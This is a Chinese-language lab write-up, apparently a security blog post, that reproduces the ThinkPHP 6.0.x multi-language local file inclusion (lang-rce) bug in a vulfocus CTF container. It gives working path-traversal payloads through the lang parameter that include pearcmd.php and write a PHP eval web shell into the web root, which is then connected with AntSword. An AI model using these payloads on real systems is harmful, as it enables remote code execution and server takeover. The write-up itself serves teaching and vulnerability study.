#  ThinkPHP 多语言本地文件包含漏洞(lang-rce)复现   
原创 炽汐安全屋  炽汐安全屋   2025-03-23 21:06  
  
描述  
  
Think  
PHP是一个再中国使用比较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意php文件。  
  
虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel/pear的环境下，可以包含/usr/local/lib/php/pearcmd.php并写入任意文件。  
  
漏洞原理  
  
当ThinkPHP的多语言功能开启时，如果未对用户输入的语言参数进行严格过滤，攻击者可以利用lang参数进行目录穿越，包含服务器上的任意文件2。在某些环境下，如开启了register_argc_argv且安装了pear扩展，攻击者甚至可以包含/usr/local/lib/php/pearcmd.php文件，从而执行任意代码  
  
漏洞影响范围  
  
该漏洞主要影响以下版本的ThinkPHP：  
  
6.0.1 ≤ ThinkPHP ≤ 6.0.13  
  
ThinkPHP 5.0.x  
  
ThinkPHP 5.1.x  
  
本次复现使用的是vulfocus靶场环境  
```
环境名为：
vulfocus/thinkphp:6.0.12
想复现的小伙伴可以使用docker拉取镜像
docker pull vulfocus/thinkphp:6.0.12
```  
  
开启靶场环境，我们从描述中可以得知访问路径为/public/index.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCYne1EaruUpbbs8nQRkvrbNw0vwic4jaytb9qtxic7NBkKrvfMoXUN3Xg/640?wx_fmt=png "")  
  
进入到靶场环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCAsvC8DYaTSjdTZ6SkLTicUExIiaRAtkdvjRWCzjPmDsfomNRiaiagFDicwA/640?wx_fmt=png "")  
  
可以看到thinkphp版本为6.0.12     存在本地文件包含漏洞  
  
我们本地抓包构造payload  
```
?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/var/www/html/shell.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCO7BdLhqZ2Njg21MibibeURRnC64cs1pgmAo4qxXRFwcm9e5jFwQicDDIw/640?wx_fmt=png "")  
  
成功后访问shell.php文件 可以看到phpinfo  
  
在其中搜索flag就可以通关了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCVPibuxmPNJXicNJHGQl5N9bApMrhVNSH9iaeeGvkIb9Jia4sdMPRv2VSRg/640?wx_fmt=png "")  
  
使用蚁剑连接：  
  
重新构造payload  
```
?lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['chixi']);?>+/var/www/html/shell.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCAKyjo76AVq6pibw9zJfM7tHWUmWJ9aLAOibLYr2fCcVgZAgtecQKzMOw/640?wx_fmt=png "")  
  
使用蚁剑连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCtoSCZ18Gb4ibfPAjIKZNdibOE2mc60NHHlylsky8ZJvSagrq6X3FUXVg/640?wx_fmt=png "")  
  
在根目录下的tmp中就可以找到flag了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCa6U4pdxlSmnAYYIact6aMRRY1f2vNxGbXJYzAJZ4WqxLt2vcic97u6w/640?wx_fmt=png "")  
  
至此ThinkPHP 多语言本地文件包含漏洞(lang-rce)复现完成  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779ZcHUSzibrqwyfuIhGic9IUHCVrSLDE2ea4YHTqia3NXWuPL2XI9NsFxsW1bkyXdpuxvJvwBeZnfJurg/640?wx_fmt=png "")  
  
  
  
  
  
  
  
  
